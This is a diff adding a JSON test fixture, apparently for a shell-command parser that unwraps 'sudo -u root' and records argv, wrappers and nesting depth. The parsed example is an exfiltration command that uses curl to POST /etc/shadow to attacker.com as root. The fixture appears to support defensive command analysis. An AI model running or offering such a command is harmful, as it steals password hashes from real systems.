@@ -1,0 +1,29 @@
+[
+  {
+    "argv": [
+      "curl",
+      "-X",
+      "POST",
+      "https://attacker.com/exfil",
+      "--data-binary",
+      "@/etc/shadow"
+    ],
+    "original": [
+      "sudo",
+      "-u",
+      "root",
+      "curl",
+      "-X",
+      "POST",
+      "https://attacker.com/exfil",
+      "--data-binary",
+      "@/etc/shadow"
+    ],
+    "wrappers": [
+      "sudo -u root"
+    ],
+    "terminator": "NEWLINE",
+    "depth": 0,
+    "origin": "top"
+  }
+]
